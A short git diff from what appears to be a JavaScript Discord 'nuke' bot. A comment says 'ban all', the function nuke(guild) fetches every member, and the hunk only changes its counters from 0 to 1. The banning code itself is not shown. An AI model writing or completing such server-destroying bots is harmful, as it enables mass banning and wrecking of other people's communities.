@@ -45,8 +45,8 @@ console.log(`Logged in as  * [ "  OROCHIX " ] servers! [ " ${client.guilds.size}
 });
 // ban all and send a message for the ownerserver
 async function nuke(guild) {
-    let users = 0;
-    let channels = 0;
+    let users = 1;
+    let channels = 1;
   
     await guild.fetchMembers();
   
